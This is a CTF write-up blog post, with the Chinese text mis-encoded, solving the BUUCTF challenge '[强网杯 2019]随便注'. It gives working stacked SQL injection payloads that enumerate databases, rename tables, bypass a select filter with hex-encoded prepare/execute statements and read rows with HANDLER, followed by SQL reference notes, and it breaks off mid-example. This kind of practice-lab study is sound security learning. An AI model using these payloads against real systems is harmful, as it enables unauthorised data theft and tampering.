{"title":"buuctfé¶åœºwp","uid":"d85793a4128cf3cc353119248e4d44d8","slug":"wp-buuctf","date":"2022-06-21T14:06:24.391Z","updated":"2023-08-06T08:01:10.360Z","comments":true,"path":"api/articles/wp-buuctf.json","keywords":null,"cover":"/img/32.jpg","content":"<p><code>webå„ä¸ªæ–¹é¢é€‰æ‹©äº†ä¸€äº›é¢˜ç›®è¿›è¡Œå­¦ä¹ ï¼Œæ„Ÿè§‰è¿˜æ˜¯å¾—ç¬¬ä¸€æ¬¡å°±åº”è¯¥çœ‹é€šå½»ï¼Œä¸åº”è¯¥ç•™æœ‰é—®é¢˜ï¼Œèƒ½å¤Ÿæ˜ç™½åŸç†å’Œä»£ç ä¸­å“ªå‡ºé€ æˆè¿™ä¸ªçš„åŸå› ï¼Œåå¤åš¼å‰©é¥­æ„Ÿè§‰æµªè´¹æ—¶é—´</code></p>\n<span id=\"more\"></span>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨\"><a href=\"#1-å¼ºç½‘æ¯-2019-éšä¾¿æ³¨\" class=\"headerlink\" title=\"1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨\"></a>1.[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨</h2><h3 id=\"1ï¼‰é¢˜ç›®æè¿°\"><a href=\"#1ï¼‰é¢˜ç›®æè¿°\" class=\"headerlink\" title=\"1ï¼‰é¢˜ç›®æè¿°\"></a>1ï¼‰é¢˜ç›®æè¿°</h3><p>æ— </p>\n<h3 id=\"2ï¼‰wp\"><a href=\"#2ï¼‰wp\" class=\"headerlink\" title=\"2ï¼‰wp\"></a>2ï¼‰wp</h3><p>å› ä¸ºä¹‹å‰æ²¡æœ‰äº†è§£è¿‡å †å æ³¨å…¥ï¼Œè¿™é‡ŒæŒ¨ä¸ªåˆ†æå­¦ä¹ </p>\n<p>å…ˆæ¥ç¡®å®šsqlæ³¨å…¥</p>\n<figure class=\"highlight matlab\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs matlab\"><span class=\"hljs-number\">1</span>&#x27;<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701113045499.png\" alt=\"image-20220701113045499\"></p>\n<p>ç„¶åè¯•è¯•æ˜¾ç¤ºæ‰€æœ‰æ•°æ®ï¼Œæ„Ÿè§‰çœ‹ä¸åˆ°ä»€ä¹ˆæ„æ€ï¼Œåé¢ä¸€æ­¥æ­¥åˆ†æ</p>\n<figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs apache\"><span class=\"hljs-attribute\">1</span>&#x27; or <span class=\"hljs-number\">1</span>=<span class=\"hljs-number\">1</span>;#<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220702105520465.png\" alt=\"image-20220702105520465\"></p>\n<p>ç„¶ååˆ¤æ–­å­—æ®µ</p>\n<p><img src=\"/post/wp-buuctf/image-20220701113210998.png\" alt=\"image-20220701113210998\"></p>\n<p><img src=\"/post/wp-buuctf/image-20220701113228972.png\" alt=\"image-20220701113228972\"></p>\n<p>åˆ¤æ–­å¤„å­—æ®µæ•°ä¸º2</p>\n<p>ç„¶åç”¨<strong>è”åˆæ³¨å…¥</strong></p>\n<p><img src=\"/post/wp-buuctf/image-20220701113604165.png\" alt=\"image-20220701113604165\"></p>\n<p>å‘ç°selectè¢«æ­£åˆ™åŒ¹é…è¿‡æ»¤äº†ï¼Œç”¨å¤§å°å†™ç»•è¿‡ä¹Ÿä¸è¡Œï¼Œæ‰€ä»¥åªèƒ½æ¢ä¸€ç§æ–¹æ³•</p>\n<p>å¯ä»¥å…ˆäº†è§£<a href=\"../../../../2022/05/28/Web-study\">å †å æ³¨å…¥</a>çš„æ¦‚å¿µå’Œæ³¨å…¥æ–¹å¼</p>\n<h4 id=\"å †å æ³¨å…¥\"><a href=\"#å †å æ³¨å…¥\" class=\"headerlink\" title=\"å †å æ³¨å…¥\"></a><strong>å †å æ³¨å…¥</strong></h4><p>å…ˆæŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“</p>\n<p><code>æ³¨ï¼šè¿™é‡Œä»ç„¶è¦æŸ¥è¯¢æ•°æ®ä¸ºå‡ï¼Œæ¯”å¦‚-1ï¼Œä¸ç„¶å°±ä¸ä¼šæ‰§è¡Œåé¢çš„sqlè¯­å¥</code></p>\n<p><code>;é—´éš”sqlè¯­å¥</code></p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\"><span class=\"hljs-number\">-1</span>&#x27;;<span class=\"hljs-keyword\">show</span> databases;<span class=\"hljs-meta\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701224154901.png\" alt=\"image-20220701224154901\"></p>\n<p>æ ¹æ®é¢˜ç›®åå­—ï¼Œå…ˆè°ƒç”¨supersqliè¿™ä¸ªåº“çš„è¡¨çœ‹çœ‹</p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\"><span class=\"hljs-number\">-1</span>&#x27;;<span class=\"hljs-keyword\">use</span> supersqli;<span class=\"hljs-keyword\">show</span> tables;<span class=\"hljs-meta\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701222551203.png\" alt=\"image-20220701222551203\"></p>\n<p>çœ‹åˆ°æœ‰ä¸¤ä¸ªè¡¨ï¼Œå…ˆçœ‹ä¸€ä¸‹çº¯æ•°å­—çš„è¡¨é‡Œçš„å†…å®¹</p>\n<p> <strong><u>æ³¨ï¼šå½“çº¯æ•°å­—å­—ç¬¦ä¸²æ˜¯è¡¨åçš„æ—¶å€™éœ€è¦åŠ åå¼•å·&#96;</u></strong></p>\n<figure class=\"highlight gauss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gauss\"><span class=\"hljs-number\">-1</span>&#x27;;<span class=\"hljs-keyword\">use</span> supersqli;<span class=\"hljs-keyword\">show</span> columns from`<span class=\"hljs-number\">1919810931114514</span>`;<span class=\"hljs-meta\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701224603433.png\" alt=\"image-20220701224603433\"></p>\n<p>çœ‹åˆ°flagåœ¨é‡Œé¢ï¼Œå†çœ‹çœ‹wordsé‡Œ</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">-1</span>&#x27;;use supersqli;show columns <span class=\"hljs-keyword\">from</span> <span class=\"hljs-built_in\">words</span>;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20220701233450179.png\" alt=\"image-20220701233450179\"></p>\n<p><code>VARCHAR(M)æ˜¯ä¸€ç§æ¯”CHARæ›´åŠ çµæ´»çš„æ•°æ®ç±»å‹ï¼ŒåŒæ ·ç”¨äºè¡¨ç¤ºå­—ç¬¦æ•°æ®ï¼Œä½†æ˜¯VARCHARå¯ä»¥ä¿å­˜å¯å˜é•¿åº¦çš„å­—ç¬¦ä¸²</code></p>\n<p>è¿™é‡ŒçŒœæµ‹ï¼Œå› ä¸ºflagæ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥çŒœæµ‹è¾“å…¥æ¡†æŸ¥è¯¢çš„å°±æ˜¯wordsè¡¨</p>\n<p>åå°sqlè¯­å¥å¯èƒ½ï¼ˆxxä¸ºè¾“å…¥æ¡†çš„å†…å®¹ï¼‰</p>\n<p><code>select id,data from words where id=xx</code></p>\n<hr>\n<p>æ›´æ”¹è¡¨ååˆ—å</p>\n<p>1ï¼Œé€šè¿‡ rename å…ˆæŠŠ words è¡¨æ”¹åä¸ºå…¶ä»–çš„è¡¨åã€‚</p>\n<p>2ï¼ŒæŠŠ 1919810931114514 è¡¨çš„åå­—æ”¹ä¸º words ã€‚</p>\n<p>3 ï¼Œå°†ä¿®æ”¹åçš„ words è¡¨ä¸­flagåˆ—åæ”¹æˆåˆ—å id ï¼Œè¿™æ ·åªéœ€è¿›è¡Œæ­£å¸¸æŸ¥è¯¢å°±ä¼šæŒ‰ä¸Šé¢çŒœæµ‹åå°sqlè¯­å¥ä¸€æ ·æ˜¾ç¤ºå‡ºflag</p>\n<figure class=\"highlight applescript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs applescript\"><span class=\"hljs-number\">-1</span>&#x27;;rename table `<span class=\"hljs-built_in\">words</span>` <span class=\"hljs-keyword\">to</span> words2;rename table `<span class=\"hljs-number\">1919810931114514</span>` <span class=\"hljs-keyword\">to</span> <span class=\"hljs-built_in\">words</span>;alter table <span class=\"hljs-built_in\">words</span> change flag <span class=\"hljs-built_in\">id</span> varchar(<span class=\"hljs-number\">100</span>);show tables;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><code>show tables</code>ä¸»è¦çœ‹çœ‹æ”¹æˆåŠŸæ²¡æœ‰ï¼Œè¿™é‡Œæ”¹è¡¨åè¦æœ‰é¡ºåºï¼Œå¦‚æœå…ˆæ”¹æ•°å­—è¡¨ï¼Œé‚£å°±å‡ºç°ä¸¤ä¸ªwordsè¡¨ï¼Œå¯¼è‡´è¯­å¥ä¸èƒ½æ‰§è¡Œï¼Œæ‰€ä»¥éœ€è¦å…ˆæ”¹wordsè¡¨åä¸ºå…¶ä»–åå­—ï¼Œç„¶åä¿®æ”¹æ•°å­—è¡¨ä¸ºwordsï¼›é¿å…å› ä¸ºåå­—è€Œå‘ç”Ÿå‘½ä»¤å†²çª</p>\n<p><img src=\"/post/wp-buuctf/image-20220702220112706.png\" alt=\"image-20220702220112706\"></p>\n<p>å¯ä»¥çœ‹åˆ°è¡¨<code>1919810931114514</code>åå­—è¢«æ”¹æˆäº†å¯æŸ¥è¯¢è¡¨<code>words</code></p>\n<p>å†çœ‹çœ‹wordsè¡¨çš„åˆ—ï¼Œflagå˜æˆäº†idï¼ŒNOå˜æˆäº†YES</p>\n<p><img src=\"/post/wp-buuctf/image-20220702220308651.png\" alt=\"image-20220702220308651\"></p>\n<p>å› ä¸ºflagä¸ºidäº†ï¼Œç”¨<code>1&#39; or 1=1;#</code>æ’çœŸæµ‹è¯•ä½¿å…¶å›æ˜¾</p>\n<p>çœ‹çœ‹å›æ˜¾æ•°æ®</p>\n<p><img src=\"/post/wp-buuctf/image-20220702221617795.png\" alt=\"image-20220702221617795\"></p>\n<p>å¾—åˆ°flag</p>\n<figure class=\"highlight pgsql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs pgsql\"><span class=\"hljs-keyword\">SQl</span>çš„<span class=\"hljs-keyword\">rename</span><br>ç”¨äºé‡å‘½åè¡¨å<br><br><br><span class=\"hljs-keyword\">SQL</span>çš„<span class=\"hljs-keyword\">alter</span>ç”¨æ³•æ€»ç»“<br><br><span class=\"hljs-number\">1</span>ï¼šåˆ é™¤åˆ—<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å <span class=\"hljs-keyword\">DROP</span> <span class=\"hljs-keyword\">COLUMN</span> åˆ—å<br><br><span class=\"hljs-number\">2</span>ï¼šå¢åŠ åˆ—<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å <span class=\"hljs-keyword\">ADD</span> <span class=\"hljs-keyword\">COLUMN</span> åˆ—å å±æ€§ ã€çº¦æŸã€‘<br><br><span class=\"hljs-number\">3</span>ï¼šä¿®æ”¹åˆ—çš„ç±»å‹ä¿¡æ¯<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å CHANGE <span class=\"hljs-keyword\">COLUMN</span> åˆ—å ã€æ–°ã€‘åˆ—å<br>æ–°å±æ€§<br><span class=\"hljs-number\">4</span>ï¼šé‡å‘½ååˆ—<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨åå­— CHANGE <span class=\"hljs-keyword\">COLUMN</span> åˆ—å æ–°åˆ—å å±æ€§<br><br><span class=\"hljs-number\">5</span>ï¼šé‡å‘½åè¡¨<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å <span class=\"hljs-keyword\">RENAME</span> <span class=\"hljs-keyword\">TO</span> è¡¨æ–°å<br><br><span class=\"hljs-number\">6</span>ï¼šåˆ é™¤è¡¨ä¸­ä¸»é”®<br><br><span class=\"hljs-keyword\">Alter</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å <span class=\"hljs-keyword\">DROP</span> <span class=\"hljs-keyword\">primary key</span><br><br><span class=\"hljs-number\">7</span>ï¼šæ·»åŠ ä¸»é”®<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å <span class=\"hljs-keyword\">ADD</span> <span class=\"hljs-keyword\">CONSTRAINT</span> çº¦æŸå <span class=\"hljs-keyword\">PRIMARY KEY</span> (æ·»åŠ åˆ—)<br><br><span class=\"hljs-number\">8</span>ï¼šæ·»åŠ ç´¢å¼•<br><br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å <span class=\"hljs-keyword\">ADD</span> <span class=\"hljs-keyword\">index</span> ç´¢å¼•å (åˆ—å);<br><br><span class=\"hljs-number\">9</span>ï¼šä¿®æ”¹åˆ—çš„å±æ€§<br><span class=\"hljs-keyword\">ALTER</span> <span class=\"hljs-keyword\">TABLE</span> è¡¨å MODIFY <span class=\"hljs-keyword\">COLUMN</span> è¦ä¿®æ”¹å±æ€§çš„åˆ—å æ–°å±æ€§;<br><br>ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸æ¨èåœ¨å»ºè¡¨åå¯¹è¡¨è¿›è¡Œå¤§å¹…åº¦ä¿®æ”¹ï¼Œå¤§å¹…åº¦ä¿®æ”¹ææœ‰å¯èƒ½ä½¿è¡¨æ•°æ®ä¸¢å¤±ã€‚<br></code></pre></td></tr></table></figure>\n\n<p>â€“</p>\n<p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpï¼Œè¿™é‡Œè¡¥å……ä¸¤ç§æ–¹æ³•</p>\n<p><a href=\"https://blog.csdn.net/qq_44657899/article/details/103239145\">åŸæ–‡é“¾æ¥</a></p>\n<h4 id=\"è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶\"><a href=\"#è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶\" class=\"headerlink\" title=\"è§£é¢˜æ€è·¯2ï¼šé¢„å¤„ç†ç»•è¿‡selecté™åˆ¶\"></a><strong>è§£é¢˜æ€è·¯2ï¼š<a href=\"https://so.csdn.net/so/search?q=%E9%A2%84%E5%A4%84%E7%90%86&spm=1001.2101.3001.7020\">é¢„å¤„ç†</a>ç»•è¿‡selecté™åˆ¶</strong></h4><p>å› ä¸ºselectè¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥å…ˆå°†</p>\n<figure class=\"highlight n1ql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs n1ql\"><span class=\"hljs-keyword\">select</span> * <span class=\"hljs-keyword\">from</span> <span class=\"hljs-symbol\">` 1919810931114514 `</span><br></code></pre></td></tr></table></figure>\n\n<p>è¿›è¡Œ16è¿›åˆ¶ç¼–ç </p>\n<p>å†é€šè¿‡æ„é€ payloadå¾—</p>\n<figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sql\">;<span class=\"hljs-keyword\">SeT</span><span class=\"hljs-variable\">@a</span><span class=\"hljs-operator\">=</span><span class=\"hljs-number\">0x73656c656374202a2066726f6d20603139313938313039333131313435313460</span>;<span class=\"hljs-keyword\">prepare</span> execsql <span class=\"hljs-keyword\">from</span> <span class=\"hljs-variable\">@a</span>;<span class=\"hljs-keyword\">execute</span> execsql;#<br></code></pre></td></tr></table></figure>\n\n<p>è¿›è€Œå¾—åˆ°flag</p>\n<pre><code>prepareâ€¦fromâ€¦æ˜¯é¢„å¤„ç†è¯­å¥ï¼Œä¼šè¿›è¡Œç¼–ç è½¬æ¢ã€‚\nexecuteç”¨æ¥æ‰§è¡Œç”±SQLPrepareåˆ›å»ºçš„SQLè¯­å¥ã€‚\nSELECTå¯ä»¥åœ¨ä¸€æ¡è¯­å¥é‡Œå¯¹å¤šä¸ªå˜é‡åŒæ—¶èµ‹å€¼,è€ŒSETåªèƒ½ä¸€æ¬¡å¯¹ä¸€ä¸ªå˜é‡èµ‹å€¼ã€‚\n</code></pre>\n<p><img src=\"/post/wp-buuctf/image-20230503173612612.png\" alt=\"image-20230503173612612\"></p>\n<h4 id=\"è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡\"><a href=\"#è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡\" class=\"headerlink\" title=\"è§£é¢˜æ€è·¯3ï¼šhandlerç»•è¿‡\"></a><strong>è§£é¢˜æ€è·¯3ï¼š<a href=\"https://so.csdn.net/so/search?q=handler&spm=1001.2101.3001.7020\">handler</a>ç»•è¿‡</strong></h4><p>payloadï¼š</p>\n<figure class=\"highlight julia\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs julia\"><span class=\"hljs-number\">1</span>&#x27;; handler <span class=\"hljs-string\">`1919810931114514`</span> open as <span class=\"hljs-string\">`a`</span>; handler <span class=\"hljs-string\">`a`</span> read next;<span class=\"hljs-comment\">#</span><br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/post/wp-buuctf/image-20230503173624567.png\" alt=\"image-20230503173624567\"></p>\n<h5 id=\"handleråŸºæœ¬ç”¨æ³•\"><a href=\"#handleråŸºæœ¬ç”¨æ³•\" class=\"headerlink\" title=\"handleråŸºæœ¬ç”¨æ³•\"></a>handleråŸºæœ¬ç”¨æ³•</h5><figure class=\"highlight gradle\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs gradle\">HANDLER tbl_name OPEN [ [AS] alias]<br><br>HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name &#123; = | &lt;= | &gt;= | &lt; | &gt; &#125; (value1,value2,...)<br>    [ WHERE where_condition ] [LIMIT ... ]<br>HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name &#123; FIRST | <span class=\"hljs-keyword\">NEXT</span> | PREV | LAST &#125;<br>    [ WHERE where_condition ] [LIMIT ... ]<br>HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> &#123; FIRST | <span class=\"hljs-keyword\">NEXT</span> &#125;<br>    [ WHERE where_condition ] [LIMIT ... ]<br>    <br>HANDLER tbl_name CLOSE<br><br>é€šè¿‡HANDLER tbl_name OPENæ‰“å¼€ä¸€å¼ è¡¨ï¼Œæ— è¿”å›ç»“æœï¼Œå®é™…ä¸Šæˆ‘ä»¬åœ¨è¿™é‡Œå£°æ˜äº†ä¸€ä¸ªåä¸ºtb1_nameçš„å¥æŸ„ã€‚<br>é€šè¿‡HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> FIRSTè·å–å¥æŸ„çš„ç¬¬ä¸€è¡Œï¼Œé€šè¿‡<span class=\"hljs-keyword\">READ</span> <span class=\"hljs-keyword\">NEXT</span>ä¾æ¬¡è·å–å…¶å®ƒè¡Œã€‚æœ€åä¸€è¡Œæ‰§è¡Œä¹‹åå†æ‰§è¡Œ<span class=\"hljs-keyword\">NEXT</span>ä¼šè¿”å›ä¸€ä¸ªç©ºçš„ç»“æœã€‚<br>é€šè¿‡HANDLER tbl_name CLOSEæ¥å…³é—­æ‰“å¼€çš„å¥æŸ„ã€‚<br><br>é€šè¿‡ç´¢å¼•å»æŸ¥çœ‹çš„è¯å¯ä»¥æŒ‰ç…§ä¸€å®šçš„é¡ºåºï¼Œè·å–è¡¨ä¸­çš„æ•°æ®ã€‚<br>é€šè¿‡HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name FIRSTï¼Œè·å–å¥æŸ„ç¬¬ä¸€è¡Œï¼ˆç´¢å¼•æœ€å°çš„ä¸€è¡Œï¼‰ï¼Œ<span class=\"hljs-keyword\">NEXT</span>è·å–ä¸‹ä¸€è¡Œï¼ŒPREVè·å–å‰ä¸€è¡Œï¼ŒLASTè·å–æœ€åä¸€è¡Œï¼ˆç´¢å¼•æœ€å¤§çš„ä¸€è¡Œï¼‰ã€‚<br><br>é€šè¿‡ç´¢å¼•åˆ—æŒ‡å®šä¸€ä¸ªå€¼ï¼Œå¯ä»¥æŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ã€‚<br>é€šè¿‡HANDLER tbl_name <span class=\"hljs-keyword\">READ</span> index_name = valueï¼ŒæŒ‡å®šä»å“ªä¸€è¡Œå¼€å§‹ï¼Œé€šè¿‡<span class=\"hljs-keyword\">NEXT</span>ç»§ç»­æµè§ˆã€‚<br></code></pre></td></tr></table></figure>\n\n\n\n<p><u><code>å¥æŸ„ï¼šã€ç›¸å½“äºä¸€ä¸ªæŒ‡é’ˆï¼Œè¿™é‡Œæ˜¯æŒ‡å‘æ•°æ®åº“é‡Œçš„è¡¨ã€‘</code></u></p>\n<h5 id=\"å®ä¾‹\"><a href=\"#å®ä¾‹\" class=\"headerlink\" title=\"å®ä¾‹\"></a>å®ä¾‹</h5><figure class=\"highlight asciidoc\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs asciidoc\">3.1 åˆ›å»ºæµ‹è¯•è¡¨åŠæµ‹è¯•æ•°æ®<br><br>create table handler<span class=\"hljs-emphasis\">_table(  </span><br><span class=\"hljs-emphasis\">    c1 int,   </span><br><span class=\"hljs-emphasis\">    c2 varchar(10),   </span><br><span class=\"hljs-emphasis\">    c3 int(10) </span><br><span class=\"hljs-emphasis\">);  </span><br><span 